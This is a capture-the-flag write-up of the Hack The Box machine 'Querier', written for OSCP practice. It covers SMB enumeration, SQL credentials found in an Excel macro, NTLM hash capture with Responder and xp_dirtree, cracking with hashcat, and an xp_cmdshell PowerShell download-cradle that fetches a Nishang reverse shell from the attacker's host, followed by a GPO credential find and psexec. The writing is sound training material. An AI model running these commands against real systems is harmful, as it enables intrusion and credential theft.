---
title: "Hack The Box - Querier"
date: 2020-01-07
tags: [oscp, htb, windows, sql]
collection: oscp-prep
published: true
layout: single
classes: wide
toc: true
toc_label: Table of Contents
headline: "Fun with MSSQL and Responder"
picture: /assets/htb-querier/machine_info.png
author_profile: false
---

![](/assets/htb-querier/machine_info.png)

## Enumeration

Our initial `nmap` scans show multiple standard Windows ports open on the box, like RPC and SMB. However, the big find is port 1433, which is running MS SQL Server 2017.

```
Nmap scan report for querier.htb (10.10.10.125)
Host is up, received user-set (0.048s latency).
Scanned at 2020-01-05 22:26:20 EST for 129s
Not shown: 65521 closed ports
Reason: 65521 resets
PORT      STATE SERVICE       REASON          VERSION
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 127
1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: QUERIER
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: QUERIER.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-01-06T03:24:56
| Not valid after:  2050-01-06T03:24:56
| MD5:   9024 f7bd 703d 6ffa 4ebe 0519 dc2d c142
| SHA-1: 9d91 b936 a3cd dd02 3024 e608 4d9d 8331 f7fa 0f92
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQSjdHW6ZgWKNLhrBh2ZvqVTANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjAwMTA2MDMyNDU2WhgPMjA1MDAxMDYwMzI0NTZaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPm6u9r0
| maU7Jk1gUwVzr3v6f7Z+XFRI8jAF0JWwER/6rl+Udu89+ORq87JlMNDCfv1mHWUp
| wm0ITmfp78hMFdPP2Z+187jd3lEyykYWMRvbU+tvjosG5efyVc77TPOUUDa4v+mc
| 08LWijdF31Em9UGpfFJiS10zU5fQAk9IumKirExEk1OLo2Elk2dxyaTyCQFXpKzi
| UKMs9V58AyNQuyc+C1+XHupZvH/8IgewYV7nGvFnLRwFlElvqW5e06clF0R5a2Vx
| NyNwb0P1W2ZQLzpDZlYXzSEArDGVxflMrL0OZIIiJmPyHaHRpL6gsvt4fC/cRQ5w
| u75rL5hjeUl/askCAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAziDtuoPAiqcStWLH
| gm3HJ9PConwa0oQ7Le7+sy8tWNaEJorp8sBVV6JyDkSJ/sMHwLan9rUI5XByQMt7
| tAI3Tfeb3U943tr1hBg3Mehz4Z9AEJMFun389w9nPrpowGW4A1LI6xZdz4PQcg55
| HnHrrWpbuN8kS4Qd+CDTo/BiVJiYMYOV2580+bAMrWNzhNPwjcbt7Av91I0eeKv0
| PghlDZnKg3k0FcRvI6WPAEjLp/EBm1suJLgEVNRsADZwkROE8l2MVc7AdlXkq+zk
| x/5/WYhJvGd3HqTJQSn8gJ29CJzhluVSZ1RWnbP24yEw3UArgR02+YcqZ/sNuoXg
| d8nZTA==
|_-----END CERTIFICATE-----
|_ssl-date: 2020-01-06T03:28:56+00:00; +27s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

---

## Initial Shell

### Excel file

We can use the `smbclient -L 10.10.10.125` command to see what shares are available on the server.

![](/assets/htb-querier/smbclient_list.png)

As shown above, we get the standard shares like `ADMIN$`, `C$`, and `IPC$`, but without credentials, these are pretty useless. HOwever, the `Reports` share looks interesting. We can again use `smbclient` to connect to it and see what's on it with `smbclient \\\\10.10.10.125\\Reports`. This opens an FTP-like interface for the share, allowing us to easily grab or place files.

We can see that there is a single macro-enabled Excel file in the share. We can grab it with the `get` command, and open if locally for review.

![](/assets/htb-querier/smbclient_getfile.png)

> NOTE: LibreOffice Calc will open Excel Macro files just fine. HOwever, I'd suggest against installing it in Kali. In this case, I had it installed on my Kubuntu host machine, so I simply opened it from there.

Opening it in LibreOffice shows that the document is blank. However, when you open the list of macros on the document, you can see the macro named *Connect*, which contains SQL connection information and credentials!

<a href="/assets/htb-querier/libreoffice_macrocode.png"><img src="/assets/htb-querier/libreoffice_macrocode.png" width="95%"></a>

```
SQL Server: QUERIER
DB Name: volume
User: reporting
Password: PcwTWTHRwryjc$c6
```

### Low-priv SQL user

So now we have credentials for the SQL server on the box. We can try them using Impacket's MSSQL client (`impacket-mssqlclient`). We can use the command `mssqlclient.py QUERIER/reporting@10.10.10.125 -windows-auth` to kick off a connection. This will open a SQL connection to the database server. Note that we have to add the `-windows-auth` option, as we're dealing with a Windows user account with SQL access, not a SQL user account.

![](/assets/htb-querier/sql_shell_reporting.png)


With any box running MSSQL server, the first thing we should check for is access to the `XP_CMDSHELL` stored procedure. This is a built-in function of MSSQL that allows for shell access via the db server. It's disabled by default, but can be enabled with the right account and permissions. The Impacket `mssqlclient.py` script gives us the ability to enable and use this feature very easily. Actually, the output of the `help` command within the SQL command prompt we're in gives us details.

```
     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
```

When we run the `enable_xp_cmdshell` command as the `reporting` user, we see that the user doesn't have the needed permissions to enable the stored procedure. Specifically, they can't issue the `RECONFIGURE` command, which allows us to change the needed settings to enable `xp_cmdshell`.

![](/assets/htb-querier/reporting_no_xp_cmdshell.png)

### Capturing user hash with `xp_dirtree` and `responder`

So at this point, we're kind of back to square one right? Well, not really. MSSQL server also gives us a cool function called `xp_dirtree`. This function allows us to list out the contents of a local or network folder, directly from MSSQL. With this, we can setup a `Responder` session to spoof a network share and capture the NTLM hash, and use `xp_dirtree` to request the share.

First, setup `Responder` with `responder.py -I tun0`. This will setup a listener on the `tun0` interface, which will listen for any SMB request, and capture the hash of the requesting machine.

Once that's setup, run the command `xp_dirtree '//10.10.14.4/testshare'` in the SQL command prompt to kick off the `xp_dirtree` function. Now you'll see that `responder` has captured the hash for the `mssql-svc` user!

> Note that `responder` listens for connections to any share name on the IP address it's assigned. So the share name you use doesn't matter at all.

<a href="/assets/htb-querier/responder_hash.png"><img src="/assets/htb-querier/responder_hash.png" width="95%"></a>

Copy the entire hash to a file. We need to run this through `hashcat` to crack the NTLMv2 hash for the password. The command `hashcat -m 5600 loot/mssql-svc_hash /data/rockyou.txt` will kick off the cracking process. It will return a password of `corporate568`.

> Sorry I don't have a screenshot of the `hashcat` process. My host PC wasn't co-operating with the tool when writing this, so I wasn't able to grab a screenshot of the tool in action.

### Using `xp_cmdshell` to get a reverse shell

Now that we have a proper username and password, we can go back to the SQL client to try for `xp_cmdshell` again.

The command `mssqlclient.py QUERIER/mssql-svc@10.10.10.125 -windows-auth` will kick off a new SQL client session as `mssql-svc`. Running `enable_xp_cmdshell` again shows that we can now properly enable the function, and use it to execute code on the system.

![](/assets/htb-querier/mssql_whoami.png)

Now that we have RCE, we can find a way to get a proper reverse shell. Since we can now see that the system in Server 2019 (via a `systeminfo` command), I know that Powershell is the best way to get a good shell. In this case, I can use Nishang's `Invoke-PowerShellTCP.ps1` script to initiate the reverse shell via `xp_cmdshell`. However, we need to make sure that we can actually use PowerShell in this manner first.

The best way to test RCE like this is to simply initiate a `ping` command against my own machine using powershell. If I can see the pings via `tcpdump`, then I know that I have access to PowerShell in the RCE method as well.

<a href="/assets/htb-querier/powershell_ping_test.png"><img src="/assets/htb-querier/powershell_ping_test.png" width="95%"></a>

As you can see in the screenshot, the test worked, and we have access to use PowerShell as part of our RCE.

Next step is to copy the Nishang script to our local directory, and modify it to kick off the shell once invoked. I also renamed the file to `revshell.ps1`, to make it easier to type out.

Add `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.4 -Port 4444` to the end of the PS1 file. When you do this, PowerShell will run that module instantly, instead of simply loading it to memory first, and waiting for a function to be invoked by the user.

Next, open a listener with `nc -lvnp 4444` to capture the shell when it returns. You'll also need to kick off a Python web server to serve the file with `python -m SimpleHTTPServer 80`.

Now, in the SQL console, we can use `xp_cmdshell powershell IEX(New-Object Net.WebClient).downloadstring(\"http://10.10.14.4/revshell.ps1\")` to tell powershell to grab the file, run it form memory, return our shell.

<a href="/assets/htb-querier/initial_shell_mssql.png"><img src="/assets/htb-querier/initial_shell_mssql.png" width="95%"></a>

Now that we have a user account, we can find `user.txt` at `C:\users\mssql-svc\desktop\user.txt`.

![](/assets/htb-querier/user_proof.png)

---

## Privlege Escalation

### Running `PowerUp.ps1` to enumerate

Since we're running a PowerShell console, we can use the `PowerUp.ps1` script from the PowerSploit suite to enumerate for weaknesses and easy wins.

We can run it from the shell with `IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.4/PowerUp.ps1')`. This will load it to memory on the machine. We can then run `Invoke-AllChecks` to kick off all system checks the script contains. This will tkae a few minutes to run while it searches for itmes that it finds interesting.

Once it returns, we see that it found a few exploitable services and hijackable DLL paths. HOwever, the easy win is the GPO object it found, containing credentials for the `Administrator` account.

![](/assets/htb-querier/gpo_creds.png)

### PSEXEC for root shell

Now that we have the creds, we can use `psexec.py administrator@10.10.10.125` to kick off a shell via the SMB shares.

![](/assets/htb-querier/root_shell.png)

As always, the root flag is located at `C:\users\administrator\desktop\root.txt`

![](/assets/htb-querier/root_proof.png)